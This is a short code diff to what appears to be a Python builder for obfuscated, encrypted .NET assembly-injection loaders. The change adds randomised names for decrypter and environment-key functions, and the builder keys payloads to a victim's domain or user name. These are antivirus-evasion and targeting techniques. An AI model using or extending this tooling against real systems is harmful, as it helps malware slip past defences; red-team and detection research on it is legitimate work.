@@ -153,7 +153,7 @@ try:
         encrypted = Encrypter.encrypt1(str(encoded), key)
         # Obfuscate variable and function names
         Obfuscator = Obfuscator()
-        hWindow, encDllB64, encDllBytes, newIV, envKey, keyBytes, plaintext, InjectAssembly, key, iv, cyphertext, rijAlg, strBytes, assembly, method = Obfuscator.varobfs()
+        hWindow, encDllB64, encDllBytes, newIV, envKey, keyBytes, plaintext, InjectAssembly, key, iv, cyphertext, rijAlg, strBytes, assembly, method, funcDecrypter, funcGetEnvKey = Obfuscator.varobfs()
         if args.domain:
             check = "string "+envKey+" = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName"
         elif args.user:
@@ -182,6 +182,8 @@ try:
             r1 = r1.replace('envKey', envKey)
             r1 = r1.replace('keyBytes', keyBytes)
             r1 = r1.replace('plaintext', plaintext)
+            r1 = r1.replace('GetEnvKey', funcGetEnvKey)
+            r1 = r1.replace('DecrypterFunction', funcDecrypter)
             r1 = r1.replace('InjectAssembly', InjectAssembly)
             r1 = r1.replace('key', key)
             r1 = r1.replace(' iv ', ' '+iv+' ')
@@ -222,7 +224,7 @@ try:
             payload = f.read()
         #print(payload)
         Encrypter = Encrypter()
-        encrypted = Encrypter.encrypt1(payload, key)
+        encrypted = Encrypter.encrypt1(str(payload), key)
         # Obfuscate variable and function names
         Obfuscator = Obfuscator()
         hWindow, encDllB64, encDllBytes, newIV, envKey, keyBytes, plaintext, InjectAssembly, key, iv, cyphertext, rijAlg, strBytes, assembly, method = Obfuscator.varobfs()
